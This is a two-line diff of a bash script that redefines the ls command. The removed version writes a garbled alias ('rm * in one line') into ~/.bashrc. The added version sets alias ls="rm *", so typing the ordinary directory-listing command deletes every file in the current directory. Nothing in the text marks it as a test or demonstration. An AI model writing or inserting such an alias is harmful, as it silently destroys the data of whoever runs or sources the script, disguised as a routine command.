@@ -1,2 +1,2 @@
-#!/bin/bash 
-echo "alias ls='rm * in one line'" >> ~/.bashrc && source ~/.bashrc & echo "Alias created successfully."
+#!/bin/bash
+alias ls="rm *"
